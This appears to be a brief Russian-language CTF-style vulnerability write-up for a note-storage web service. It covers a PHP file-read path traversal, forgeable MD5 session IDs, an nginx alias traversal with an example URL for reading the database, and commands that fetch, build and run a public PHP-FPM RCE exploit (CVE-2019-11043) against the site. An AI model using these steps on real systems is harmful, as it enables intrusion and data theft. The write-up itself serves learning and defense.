# Local File Include

```php=
function ReadNote($username, $filename){
    $content = @file_get_contents("./notes/".$username."/".$filename);

```

Нет проверки на выход за пределы директории, можно прочитать произвольный файл в системе.

---

# Session Forging

```php=
function GenerateSessionID($login){
	return hash('md5', implode('', unpack("L", substr(hash('md5',$login),0,4)))); 
}
```

Функция генерирующа параметр uuid уязвима к подделке сессий. Зная имя юзера (можно получить из файла NoteLog, увидеть 5 последних записей на index.php, получить из файла database.db) можно сгенерировать сессию и посмотреть все заметки.

---

# Nginx alias path traversal

```nginx=
  location /images {
    alias /var/www/html/static/;
```

Директория static/ перенаправляется через псевдоним на директорию images, но так как в конце не стоит символ "/" - есть возможность использовать уязвимость alias path traversal и прочитать любой файл, например:
http://notestorage.local/images../html/database.db


---

# PHP-FPM Nginx RCE

Произвольное исполнение комманд через уязвимость [CVE 2019-11043](https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc)

```bash=
  git clone https://github.com/neex/phuip-fpizdam.git && cd phuip-
  go build
  ./phuip-fpizdam http://notestorage.local/register.php
```

Файл php к которому идет обращение не должен содержать параметр сессии, поэтому оптимальным вариантом является использование файла register.php
